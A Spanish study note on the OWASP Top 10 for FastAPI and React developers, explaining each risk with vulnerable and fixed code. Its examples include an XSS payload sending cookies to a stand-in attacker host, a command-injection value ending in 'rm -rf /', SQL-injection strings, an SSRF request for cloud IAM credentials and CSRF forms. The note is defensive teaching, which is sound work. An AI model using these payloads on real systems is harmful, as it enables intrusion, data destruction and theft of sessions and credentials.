---
title: Seguridad web (OWASP Top 10)
date: 2026-06-14
tags: [ciberseguridad, programacion/seguridad, web/owasp, web/vulnerabilidades, programacion/backend, programacion/fastapi]
type: nota
status: en-progreso
source: claude-code
aliases: [OWASP Top 10, seguridad web, vulnerabilidades web]
---

# Seguridad web (OWASP Top 10)

## ¿Por qué importa este mapa?

Las aplicaciones web son la superficie de ataque más explotada del mundo real. El **OWASP Top 10** (Open Web Application Security Project) es el catálogo de referencia de los riesgos más críticos en aplicaciones web, actualizado por la comunidad global de seguridad. No es una lista de exploits raros: es un inventario de errores que cometen equipos de ingeniería competentes todos los días.

Para un developer que construye APIs y frontends (tipo FastAPI + React, como), este documento es el equivalente al checklist de seguridad de vuelo: si no lo sigues, los fallos son predecibles.

> **Versión de referencia**: OWASP Top 10 2021 (la más reciente con categorías estabilizadas).

```
Panorama de riesgo web:
[Usuario/Atacante]
      │
      ▼
[Navegador / Cliente]
      │  ← XSS y CSRF viven aquí (lado cliente)
      ▼
[Frontend / API Gateway]
      │  ← Inyección, Auth Failures, SSRF viven aquí
      ▼
[Backend (FastAPI, Django, etc.)]
      │  ← Access Control, Misconfig, Logging viven aquí
      ▼
[Base de datos / Servicios internos]
```

---

## Índice OWASP Top 10 (2021)

| # | Categoría | Riesgo principal |
|---|-----------|-----------------|
| A01 | Broken Access Control | Usuarios acceden a recursos que no les pertenecen |
| A02 | Cryptographic Failures | Datos sensibles expuestos por cifrado débil o ausente |
| A03 | Injection | Código malicioso ejecutado en el servidor via input |
| A04 | Insecure Design | La arquitectura misma tiene huecos de seguridad |
| A05 | Security Misconfiguration | Configuración incorrecta del sistema/framework |
| A06 | Vulnerable & Outdated Components | Dependencias con CVEs conocidos |
| A07 | Identification & Authentication Failures | Autenticación rota o suplantable |
| A08 | Software & Data Integrity Failures | Actualizaciones o pipelines sin verificar integridad |
| A09 | Security Logging & Monitoring Failures | No detectas que te están atacando |
| A10 | Server-Side Request Forgery (SSRF) | El servidor hace peticiones a donde el atacante ordena |
| +XSS | Cross-Site Scripting | JS malicioso ejecutado en el navegador de la víctima |
| +CSRF | Cross-Site Request Forgery | Acciones no autorizadas en nombre del usuario autenticado |

---

## A01 Broken Access Control

### ¿Qué es?
**Control de acceso** (o autorización) es la pregunta: "¿Tiene este usuario permiso para hacer *esta acción* sobre *este recurso*?" Cuando falla, cualquier usuario puede acceder a datos o funciones que no le corresponden.

Diferencia clave: **autenticación** = verificar quién eres; **autorización** = verificar qué puedes hacer. Son sistemas distintos y pueden fallar independientemente.

### Ejemplo conceptual
```
GET /api/facturas/1234   → devuelve la factura del usuario A
GET /api/facturas/1235   → también la devuelve... aunque eres el usuario B
```
Esto se llama **IDOR** (Insecure Direct Object Reference): el ID en la URL referencia directamente un registro en BD sin verificar propiedad.

Otro patrón frecuente:
```
# Endpoint "solo admin" que simplemente no verifica el rol
GET /admin/usuarios → devuelve todos los usuarios si conoces la ruta
```

### Cómo prevenirlo
- **Denegar por defecto**: todo acceso denegado salvo que se conceda explícitamente.
- **Verifica propiedad en cada endpoint**, no solo en la UI:
  ```python
  # FastAPI con dependencia de autorización
  @router.get("/facturas/{factura_id}")
  async def get_factura(
      factura_id: int,
      current_user: User = Depends(get_current_user),
      db: Session = Depends(get_db)
  ):
      factura = db.query(Factura).filter(
          Factura.id == factura_id,
          Factura.user_id == current_user.id  # ← ESTO es el control
      ).first()
      if not factura:
          raise HTTPException(status_code=404)
      return factura
  ```
- **RBAC/ABAC**: Role-Based Access Control o Attribute-Based. Define roles explícitos (admin, editor, viewer) y compruébalos.
- Logs de accesos denegados: saber quién intenta acceder a qué.
- Tests de autorización: intenta acceder a recursos de otro usuario en tus tests de integración.

---

## A02 Cryptographic Failures

### ¿Qué es?
Datos sensibles (contraseñas, tarjetas, tokens, datos médicos) almacenados o transmitidos sin cifrado adecuado, o con algoritmos rotos. Antes se llamaba "Sensitive Data Exposure".

### Ejemplo conceptual
- Contraseñas guardadas en texto plano o con MD5/SHA1 (algoritmos rápidos, vulnerables a rainbow tables y fuerza bruta GPU).
- API que devuelve campos sensibles innecesarios en JSON.
- HTTP sin TLS en un endpoint de login.
- Token de sesión en la URL (queda en logs del servidor, historial del navegador).

### Cómo prevenirlo

| Qué proteger | Solución correcta |
|---|---|
| Contraseñas en BD | bcrypt, Argon2, scrypt (lentos y con salt) |
| Datos en tránsito | TLS 1.2+ (HTTPS obligatorio) |
| Datos sensibles en BD | Cifrado de columnas si son datos muy críticos |
| Tokens de sesión | Cookies HttpOnly + Secure + SameSite, nunca en URL |
| Claves API | Variables de entorno / secret manager, nunca en código |

```python
# FastAPI — hashear contraseña con passlib/bcrypt
from passlib.context import CryptContext

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

def hash_password(password: str) -> str:
    return pwd_context.hash(password)

def verify_password(plain: str, hashed: str) -> bool:
    return pwd_context.verify(plain, hashed)
```

Nunca implementes tu propio cifrado. Usa librerías auditadas.

---

## A03 Injection (SQLi, Command Injection, etc.)

### ¿Qué es?
**Inyección** ocurre cuando datos no confiables (input del usuario) se interpretan como código en lugar de datos. El atacante controla la lógica del programa enviando caracteres especiales.

**SQL Injection (SQLi)** es el caso más conocido, pero existen: Command Injection, LDAP Injection, Template Injection (SSTI), NoSQL Injection.

### Ejemplo conceptual — SQLi
```python
# VULNERABLE: interpolación directa de string
query = f"SELECT * FROM users WHERE email = '{user_email}'"
# Si user_email = "' OR '1'='1", la query devuelve TODOS los usuarios

# Input malicioso:  admin@x.com' --
# Query resultante: SELECT * FROM users WHERE email = 'admin@x.com' --'
# El -- comenta el resto → salta la contraseña
```

### Ejemplo — Command Injection
```python
# VULNERABLE: input del usuario en subprocess
import subprocess
filename = request.query_params["file"]
subprocess.run(f"cat logs/{filename}", shell=True)
# Si filename = "../../etc/passwd ; rm -rf /" → desastre
```

### Cómo prevenirlo

**Regla de oro: separar código de datos.**

- **Prepared statements / queries parametrizadas** (la solución definitiva para SQLi):
  ```python
  # Con SQLAlchemy ORM (FastAPI) — automáticamente seguro
  db.query(User).filter(User.email == email).first()

  # Con SQL crudo — usar parámetros explícitos
  db.execute(text("SELECT * FROM users WHERE email = :email"), {"email": email})
  ```
- **Validación de input**: rechaza formatos inesperados antes de procesarlos. Pydantic en FastAPI hace esto excelente:
  ```python
  class LoginRequest(BaseModel):
      email: EmailStr       # valida formato email
      password: str = Field(min_length=8, max_length=128)
  ```
- **Principio de mínimo privilegio en BD**: el usuario de BD de la app solo tiene SELECT/INSERT/UPDATE en las tablas necesarias, nunca DROP o acceso al sistema.
- Nunca uses `shell=True` en subprocess con input del usuario.
- Para Template Injection (SSTI): nunca renderices templates con strings del usuario directamente (Jinja2 con autoescape activado).

---

## A04 Insecure Design

### ¿Qué es?
No es un bug de implementación, sino un **fallo en la arquitectura o en el modelado de amenazas**. La aplicación se diseñó sin considerar qué puede hacer un atacante. Los controles técnicos no pueden parchear un diseño fundamentalmente inseguro.

### Ejemplo conceptual
- Sistema de recuperación de contraseña que pregunta "¿Cuál es tu color favorito?" (preguntas de seguridad predecibles).
- Flujo de e-commerce que valida el precio en el cliente (frontend), no en el servidor: el atacante puede modificar el precio antes de enviarlo.
- API que no tiene rate limiting en el endpoint de login: permite fuerza bruta ilimitada.
- Lógica de negocio que permite transferir fondos sin second factor en operaciones grandes.

### Cómo prevenirlo
- **Threat modeling** (modelado de amenazas): antes de codificar, pregunta ¿qué puede hacer un atacante con este flujo? Metodología básica: STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege).
- **Validación en el servidor siempre**, nunca confíes en validaciones del cliente.
- **Rate limiting** en endpoints sensibles (login, registro, recuperación de contraseña):
  ```python
  # FastAPI con slowapi
  from slowapi import Limiter
  limiter = Limiter(key_func=get_remote_address)

  @router.post("/login")
  @limiter.limit("5/minute")
  async def login(request: Request, ...):
      ...
  ```
- Diseña con "secure by default": los valores por defecto deben ser los más seguros.

---

## A05 Security Misconfiguration

### ¿Qué es?
El framework, servidor, base de datos o nube están **mal configurados**. Incluye: configuraciones por defecto inseguras, directorios/archivos expuestos innecesariamente, mensajes de error que revelan stack traces, permisos excesivos en cloud.

### Ejemplos frecuentes
- FastAPI/Django en producción con `DEBUG=True` → expone stack traces con variables, rutas internas, versiones.
- MongoDB/Redis sin autenticación expuesto en internet (vulnerabilidad masiva histórica).
- Bucket de S3 con permisos públicos de lectura.
- Headers HTTP de seguridad ausentes (ver tabla abajo).
- Swagger UI (`/docs`) accesible en producción sin autenticación.
- Credenciales por defecto en bases de datos o paneles de administración.

### Cómo prevenirlo

**Headers HTTP de seguridad** (configura en tu servidor/middleware):

| Header | Qué hace |
|---|---|
| `Content-Security-Policy` | Restringe orígenes de scripts/estilos/recursos |
| `X-Content-Type-Options: nosniff` | Evita que el navegador adivine el MIME type |
| `X-Frame-Options: DENY` | Previene clickjacking (iframe malicioso) |
| `Strict-Transport-Security` | Fuerza HTTPS siempre |
| `Referrer-Policy` | Controla qué info de referrer se envía |

```python
# FastAPI — middleware de headers de seguridad
from fastapi.middleware.trustedhost import TrustedHostMiddleware
from starlette.middleware.base import BaseHTTPMiddleware

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
        return response
```

- Usar variables de entorno para toda configuración sensible (nunca hardcodeada).
- Deshabilitar endpoints de diagnóstico en producción (`/docs`, `/redoc`, `/openapi.json` de FastAPI).
- Auditar permisos de cloud regularmente (principio de mínimo privilegio).
- Automatizar revisión de configuración con herramientas (trivy, checkov para IaC).

---

## A06 Vulnerable & Outdated Components

### ¿Qué es?
Usas librerías, frameworks o contenedores Docker con **CVEs conocidos** (Common Vulnerabilities and Exposures: identificadores de vulnerabilidades públicas). Si el atacante conoce qué versión usas, conoce tus brechas.

**Ejemplo histórico**: Log4Shell (CVE-2021-44228) afectó millones de sistemas Java porque casi todos usaban Log4j. Una sola dependencia, impacto global.

### Cómo prevenirlo
- **Mantén un inventario de dependencias** (SBOM: Software Bill of Materials).
- **Actualiza regularmente**: configura Dependabot (GitHub) o Renovate para PRs automáticos de actualización.
- **Escanea vulnerabilidades** en CI/CD:
  ```bash
  # Con pip-audit para Python
  pip-audit

  # Con safety
  safety check

  # Con trivy para imágenes Docker
  trivy image tu-imagen:latest
  ```
- Usa solo dependencias activamente mantenidas. Evalúa el riesgo de dependencias abandonadas.
- Fija versiones en `requirements.txt` / `package.json` para evitar sorpresas, pero activa alertas de seguridad.

---

## A07 Identification & Authentication Failures

### ¿Qué es?
Fallos en cómo la aplicación verifica la identidad del usuario. Permite suplantación, toma de cuentas (Account Takeover), o evasión del mecanismo de autenticación.

### Patrones de fallo
- Sin límite de intentos de login → fuerza bruta posible.
- Tokens de sesión predecibles (generados con `random()` no criptográfico).
- Sesiones que no se invalidan al cerrar sesión o al cambiar contraseña.
- JWT con algoritmo `none` (fallo clásico: el token se acepta sin firma).
- Credenciales por defecto nunca cambiadas.
- Sin MFA en cuentas privilegiadas.

### JWT — trampas comunes
```
# Payload de JWT decodificado (base64, NO cifrado — solo firmado)
{
  "sub": "usuario123",
  "role": "user",
  "exp": 1718000000
}
# Si el atacante puede modificar "role": "admin" Y el servidor acepta
# alg: none → no hay firma que verificar → escalada de privilegios
```

### Cómo prevenirlo
```python
# FastAPI con python-jose — siempre especifica algoritmo explícito
from jose import JWTError, jwt

SECRET_KEY = os.getenv("SECRET_KEY")  # De variable de entorno
ALGORITHM = "HS256"                   # Nunca "none"

def create_access_token(data: dict, expires_delta: timedelta):
    to_encode = data.copy()
    expire = datetime.utcnow() + expires_delta
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

def verify_token(token: str):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        # algorithms es lista — no acepta otros
        return payload
    except JWTError:
        raise HTTPException(status_code=401)
```

- Rate limiting en login (ver A04).
- Tokens de sesión generados con `secrets.token_urlsafe()` (Python), nunca `random`.
- Invalidar tokens al logout (lista negra de JTI, o usar tokens de corta duración + refresh tokens).
- MFA para cuentas admin.
- No revelar en mensajes de error si el email existe o no ("Email o contraseña incorrectos", no "Email no encontrado").

---

## A08 Software & Data Integrity Failures

### ¿Qué es?
El código o datos que la aplicación carga **no se verifican en integridad**. Incluye: pipelines CI/CD que ejecutan código de terceros sin verificar, actualizaciones de software sin firma, deserialización insegura de datos no confiables.

### Ejemplos
- Pipeline de CI que hace `curl https://scripts-externos.com/install.sh | bash` sin verificar checksum.
- Dependencias instaladas sin fijar versiones exactas → un atacante que compromete npm puede inyectar código malicioso en una versión nueva (supply chain attack).
- Deserialización de objetos pickle de Python desde input de usuario → ejecución de código arbitrario.

### Cómo prevenirlo
- **Fijar versiones exactas** de dependencias y verificar hashes:
  ```bash
  pip install --require-hashes -r requirements.txt
  ```
- **Verificar checksums** de scripts/binarios descargados antes de ejecutar.
- **No deserializar pickle/YAML unsafe de fuentes no confiables**:
  ```python
  # PELIGROSO con input de usuario
  import pickle
  obj = pickle.loads(user_data)  # puede ejecutar código arbitrario

  # Alternativa: JSON (no ejecuta código)
  import json
  obj = json.loads(user_data)
  ```
- Firmar releases y artefactos de CI/CD.
- Usar `pip-audit` y `npm audit` en el pipeline.

---

## A09 Security Logging & Monitoring Failures

### ¿Qué es?
Si no registras lo que pasa en tu app, no puedes detectar ataques en curso, investigar incidentes post-mortem, ni cumplir requisitos legales. El tiempo medio de detección de una brecha es de **~200 días** — generalmente por terceros, no por el propio equipo.

### Qué debes registrar (y qué no)

**Registrar:**
- Logins exitosos y fallidos (con IP, timestamp, user-agent).
- Cambios de contraseña / email.
- Accesos denegados (403) — especialmente patrones repetidos.
- Operaciones críticas: transferencias, borrado de datos, cambios de rol.
- Errores de validación de entrada (pueden indicar escaneo/fuzzing).

**NO registrar (datos sensibles):**
- Contraseñas (ni hasheadas).
- Tokens de sesión / API keys completos.
- Números de tarjeta o datos médicos.

### Cómo implementarlo en FastAPI
```python
import logging
import structlog  # logging estructurado (JSON) — recomendado

logger = structlog.get_logger()

@router.post("/login")
async def login(request: LoginRequest, req: Request):
    user = authenticate(request.email, request.password)
    if not user:
        logger.warning(
            "login_failed",
            email=request.email,
            ip=req.client.host,
            user_agent=req.headers.get("user-agent")
        )
        raise HTTPException(status_code=401, detail="Credenciales inválidas")
    logger.info("login_success", user_id=user.id, ip=req.client.host)
    ...
```

- Centraliza logs (ELK Stack, Loki, CloudWatch).
- Configura alertas para patrones anómalos (N fallos de login en X minutos).
- Asegura que los logs no sean modificables (append-only, off-server).

---

## A10 Server-Side Request Forgery (SSRF)

### ¿Qué es?
El atacante hace que el **servidor** realice peticiones HTTP a destinos arbitrarios, incluyendo servicios internos que no deberían ser accesibles desde internet. El servidor actúa como proxy involuntario.

**Por qué es peligroso en cloud**: los proveedores (AWS, GCP, Azure) tienen endpoints de metadatos internos (`http://169.254.169.254/`) que devuelven credenciales temporales de IAM. Si el servidor puede acceder a esa IP, el atacante puede robar las credenciales de la instancia.

### Ejemplo conceptual
```
# Endpoint que toma una URL del usuario y la descarga
POST /api/preview
{"url": "https://ejemplo.com/imagen.jpg"}

# El atacante envía:
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
# El servidor lo busca y devuelve credenciales AWS al atacante
```

### Cómo prevenirlo
- **Nunca hagas peticiones a URLs arbitrarias del usuario**. Si es necesario, valida con una whitelist de dominios permitidos.
- **Bloquea IPs internas** en el servidor (169.254.x.x, 10.x.x.x, 192.168.x.x, 172.16-31.x.x).
- Deshabilita el endpoint de metadatos IMDSv1 en AWS (migra a IMDSv2 que requiere token).
- Usa un egress firewall que limite a qué destinos puede conectarse tu servicio.
- Nunca devuelvas la respuesta completa de la petición al usuario — si procesas la URL internamente, devuelve solo lo necesario.

---

## XSS — Cross-Site Scripting

### ¿Qué es?
El atacante inyecta **JavaScript malicioso** en páginas que verán otros usuarios. El JS se ejecuta en el navegador de la víctima con acceso a sus cookies, datos de sesión y DOM.

**Tipos:**
- **Stored XSS**: el payload se guarda en BD y se muestra a todos (comentarios, perfiles).
- **Reflected XSS**: el payload viene en la URL/request y se refleja en la respuesta inmediata.
- **DOM XSS**: la manipulación ocurre enteramente en JavaScript del cliente.

### Ejemplo conceptual
```html
<!-- Stored XSS: usuario pone esto como nombre de perfil -->
<script>document.location='https://atacante.com/steal?c='+document.cookie</script>

<!-- Si el servidor lo guarda y el frontend lo renderiza sin escapar,
     todos los usuarios que vean ese perfil envían sus cookies al atacante -->
```

### Cómo prevenirlo
- **Output encoding**: nunca insertes datos del usuario directamente en HTML. Los frameworks modernos lo hacen automáticamente (React escapa por defecto con JSX, pero `dangerouslySetInnerHTML` lo deshabilita — úsalo solo si sabes lo que haces).
- **Content Security Policy (CSP)**: header que restringe de dónde puede cargarse JavaScript:
  ```
  Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'
  ```
  Con una CSP estricta, incluso si hay XSS, el script no puede ejecutarse.
- **HttpOnly cookies**: las cookies de sesión con `HttpOnly` no son accesibles desde JavaScript, limitando el daño.
- Sanitiza HTML de usuarios si necesitas permitirles formato (usa DOMPurify en el cliente, o bleach en Python servidor).

---

## CSRF — Cross-Site Request Forgery

### ¿Qué es?
El atacante engaña al navegador del usuario autenticado para que **envíe peticiones no autorizadas** a la app. El navegador incluye automáticamente las cookies de sesión, así que la app las acepta como legítimas.

Diferencia clave con XSS: CSRF no necesita ejecutar JS en la víctima — basta con que visite una página con una imagen/form oculto.

### Ejemplo conceptual
```html
<!-- Página del atacante que la víctima visita -->
<img src="https://tubank.com/transferir?cantidad=10000&destino=atacante" />
<!-- El navegador hace GET con las cookies de sesión del usuario → transferencia ejecutada -->

<!-- O con form oculto para POST -->
<form action="https://tuapp.com/cambiar-email" method="POST">
  <input name="email" value="atacante@mal.com" />
</form>
<script>document.forms[0].submit()</script>
```

### Cómo prevenirlo
- **CSRF tokens**: token único por sesión/formulario que el servidor verifica. No puede ser leído desde otra origen por la Same-Origin Policy.
- **SameSite cookies**: atributo que impide que las cookies se envíen en peticiones cross-site:
  ```
  Set-Cookie: session=abc; SameSite=Strict; HttpOnly; Secure
  ```
  `SameSite=Lax` o `Strict` es la defensa más sencilla y moderna.
- **Verificar el header `Origin` / `Referer`** en peticiones mutantes (POST, PUT, DELETE).
- APIs REST con JWT en `Authorization: Bearer` (no cookies) son naturalmente inmunes a CSRF.

---

## Mapa de defensas — resumen por capa

```
┌─────────────────────────────────────────────────────┐
│ CLIENTE (navegador)                                  │
│  · SameSite cookies → previene CSRF                  │
│  · HttpOnly cookies → limita daño de XSS             │
│  · CSP header → limita ejecución de XSS              │
│  · Output encoding en React/Vue/Angular              │
├─────────────────────────────────────────────────────┤
│ RED / TRANSPORTE                                     │
│  · TLS obligatorio (HTTPS)                           │
│  · HSTS header                                       │
├─────────────────────────────────────────────────────┤
│ BACKEND / API (FastAPI)                              │
│  · Prepared statements → previene SQLi               │
│  · Pydantic validation → valida todo input           │
│  · Rate limiting → previene brute force              │
│  · Auth dependencies → control de acceso             │
│  · Logging estructurado → detecta anomalías          │
│  · SSRF whitelist → controla egress                  │
├─────────────────────────────────────────────────────┤
│ INFRAESTRUCTURA / CONFIG                             │
│  · Secretos en env vars / vault                      │
│  · Dependencias auditadas y actualizadas             │
│  · Debug OFF en producción                           │
│  · Principio de mínimo privilegio en BD y cloud      │
└─────────────────────────────────────────────────────┘
```

---

## Errores comunes de developers (sin mala intención)

1. **"La validación la hace el frontend"** → el atacante no usa tu frontend; llama la API directamente con curl.
2. **`DEBUG=True` en producción** → expone stack traces y, en Django, una consola interactiva.
3. **Guardar secretos en el código fuente** → quedan en el historial de git para siempre.
4. **JWT sin expiración** → un token robado es válido para siempre.
5. **Trusting user-supplied Content-Type** → el servidor debe validar él mismo el tipo de los datos.
6. **Sin rate limiting en endpoints de autenticación** → cualquier contraseña débil es adivinable en minutos.
7. **CORS con `allow_origins=["*"]` en producción** → permite que cualquier web acceda a tu API autenticada.

---

## Aplícalo / practica

### En tus propios proyectos
- ****: auditar con este checklist:
  - [ ] ¿Cada endpoint de FastAPI verifica que el usuario solo accede a SUS datos?
  - [ ] ¿Las contraseñas se hashean con bcrypt/Argon2?
  - [ ] ¿Los secretos están en `.env` y `.env` está en `.gitignore`?
  - [ ] ¿Hay rate limiting en `/login` y `/register`?
  - [ ] ¿`DEBUG=False` en producción (docker-compose.yml)?
  - [ ] ¿Los headers de seguridad están configurados?
  - [ ] ¿Se escanean las dependencias en CI?

### CTFs y laboratorios
- **[OWASP WebGoat](https://owasp.org/www-project-webgoat/)**: app deliberadamente vulnerable para practicar, en Docker local. Cubre todos los Top 10 con ejercicios guiados.
- **[DVWA](https://dvwahq.github.io/)** (Damn Vulnerable Web App): clásico, corre en Docker.
- **[PortSwigger Web Security Academy](https://portswigger.net/web-security)**: el mejor recurso gratuito. Labs interactivos de SQLi, XSS, CSRF, SSRF, etc. con Burp Suite.
- **HackTheBox / TryHackMe**: salas específicas de web (busca "OWASP" o "SQL injection").
- **PentesterLab**: labs de web con certificación.

### Herramientas para aprender (en lab propio)
| Herramienta | Para qué |
|---|---|
| Burp Suite Community | Interceptar y modificar peticiones HTTP (proxy) |
| OWASP ZAP | Scanner automático de vulnerabilidades web |
| sqlmap | Automatiza detección de SQLi (solo en targets autorizados) |
| ffuf / gobuster | Fuzzing de directorios y parámetros |
| Nikto | Scanner de misconfigurations web |

> **Ética y legalidad**: todas estas herramientas son ilegales de usar en sistemas ajenos sin permiso escrito. Úsalas únicamente en laboratorios propios (VMs con DVWA/WebGoat), CTFs oficiales, o con autorización explícita del propietario (bug bounty). El pentesting sin permiso es un delito en la mayoría de jurisdicciones, independientemente de la intención.

---

## Conexiones

- [[MOC_Ciberseguridad]]
- [[01-fundamentos-y-mentalidad]]
- [[02-criptografia]]
- [[03-seguridad-de-redes]]
- [[05-identidad-auth-y-secretos]]
- [[06-seguridad-de-sistemas-y-hardening]]
- [[07-pentesting-y-ciclo-del-ataque]]
- [[08-vulnerabilidades-y-explotacion]]
- [[09-devsecops-y-appsec]]
- [[10-blue-team-y-respuesta-incidentes]]
- [[MOC_Desarrollo_Software]]
